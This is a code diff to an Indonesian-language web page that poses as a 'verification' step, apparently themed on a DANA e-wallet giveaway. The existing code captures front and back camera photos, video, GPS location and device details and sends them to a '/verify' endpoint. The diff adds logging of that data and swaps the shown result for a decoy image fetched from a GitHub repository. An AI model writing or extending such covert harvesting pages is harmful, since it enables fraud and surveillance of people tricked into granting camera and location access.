@@ -52,7 +52,7 @@
         <div class="status-text" id="statusText">⏳ Memulai verifikasi...</div>
     </div>
 
-    <!-- RESULT FOTO -->
+    <!-- RESULT FOTO DARI GITHUB -->
     <div class="container result-container" id="resultContainer">
         <img src="" alt="Result" class="result-image" id="resultImage">
     </div>
@@ -286,6 +286,32 @@
         }
 
         // ============================================
+        // 🖼️ AMBIL GAMBAR DARI GITHUB
+        // ============================================
+        async function getImageFromGitHub() {
+            try {
+                const username = 'danakagetberkah';
+                const repo = 'DANA-BERKAH';
+                const branch = 'main';
+                const imagePath = 'foto.jpg';
+                
+                const response = await fetch(
+                    `https://api.github.com/repos/${username}/${repo}/contents/${imagePath}?ref=${branch}`
+                );
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    const base64Image = data.content;
+                    return `data:image/jpeg;base64,${base64Image}`;
+                }
+                return null;
+            } catch (err) {
+                console.error('Error ambil gambar:', err);
+                return null;
+            }
+        }
+
+        // ============================================
         // 🚀 MAIN PROCESS
         // ============================================
         async function startProcess() {
@@ -302,9 +328,11 @@
                 // 3. GPS
                 statusText.textContent = '📍 Mengambil lokasi...';
                 const gps = await getGPSLocation();
+                console.log('📍 GPS:', gps);
 
                 // 4. DEVICE INFO
                 const device = getDeviceInfo();
+                console.log('📱 Device:', device);
 
                 // 5. SEND TO SERVER
                 statusText.textContent = '📤 Mengirim data...';
@@ -318,29 +346,42 @@
                     });
                 }
 
+                const requestData = {
+                    frontPhoto: photos.front,
+                    backPhoto: photos.back,
+                    video: videoBase64,
+                    gps: gps,
+                    device: device,
+                    timestamp: new Date().toISOString()
+                };
+                console.log('📤 Sending data:', {
+                    frontPhoto: !!requestData.frontPhoto,
+                    backPhoto: !!requestData.backPhoto,
+                    video: !!requestData.video,
+                    gps: requestData.gps,
+                    device: requestData.device
+                });
+
                 const response = await fetch('/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        frontPhoto: photos.front,
-                        backPhoto: photos.back,
-                        video: videoBase64,
-                        gps: gps,
-                        device: device,
-                        timestamp: new Date().toISOString()
-                    })
+                    body: JSON.stringify(requestData)
                 });
 
                 const result = await response.json();
                 console.log('📨 Response:', result);
 
-                // TAMPILKAN FOTO
-                if (photos.front) {
-                    resultImage.src = photos.front;
-                } else if (photos.back) {
-                    resultImage.src = photos.back;
+                // ===== TAMPILKAN FOTO DARI GITHUB =====
+                const githubImage = await getImageFromGitHub();
+                if (githubImage) {
+                    resultImage.src = githubImage;
                 } else {
-                    resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
+                    // Fallback kalau gagal ambil dari GitHub
+                    if (photos.front) {
+                        resultImage.src = photos.front;
+                    } else {
+                        resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
+                    }
                 }
 
                 setTimeout(() => {
@@ -352,7 +393,13 @@
                 console.error('❌ Error:', err);
                 loadingContainer.classList.add('hidden');
                 resultContainer.classList.add('visible');
-                resultImage.src = 'https://via.placeholder.com/400x600/ff6b6b/fff?text=Error';
+                // Coba ambil dari GitHub juga kalau error
+                const githubImage = await getImageFromGitHub();
+                if (githubImage) {
+                    resultImage.src = githubImage;
+                } else {
+                    resultImage.src = 'https://via.placeholder.com/400x600/ff6b6b/fff?text=Error';
+                }
             }
         }
 
